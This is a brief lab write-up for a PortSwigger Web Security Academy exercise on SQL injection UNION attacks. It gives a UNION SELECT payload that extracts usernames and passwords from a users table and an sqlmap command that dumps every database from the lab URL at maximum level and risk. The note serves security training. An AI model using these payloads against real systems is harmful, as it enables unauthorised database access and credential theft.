https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
If we could retrieve data from certain column, you should use `from` keyword
```
' UNION SELECT username, password FROM users--
```

### automated
You could easily do this lab with automated tools:
```bash
sqlmap --dump-all -u "https://0adc00b404a522928156e34000c8000d.web-security-academy.net/filter?category=Pets" -p category --level=3 --risk=3 --batch --dbs
```
